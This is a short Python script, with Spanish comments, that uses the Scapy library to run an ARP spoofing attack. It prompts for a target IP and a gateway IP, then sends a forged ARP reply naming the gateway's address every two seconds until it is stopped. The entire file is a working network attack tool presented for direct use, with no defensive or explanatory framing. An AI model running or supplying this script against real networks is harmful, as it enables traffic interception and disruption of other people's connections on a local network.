from scapy.all import ARP, send
import time

def arp_spoof(target_ip, gateway_ip, interface="eth0"):
    try:
        while True:
            # Crear paquete ARP falsificado para la IP objetivo
            arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, op='is-at')
            # Enviar el paquete
            send(arp_response, verbose=0, iface=interface)
            # Esperar 2 segundos antes de enviar el siguiente paquete
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nARP spoofing detenido")

if __name__ == "__main__":
    target_ip = input("Ingrese la IP objetivo: ")
    gateway_ip = input("Ingrese la IP del gateway: ")

    arp_spoof(target_ip, gateway_ip)
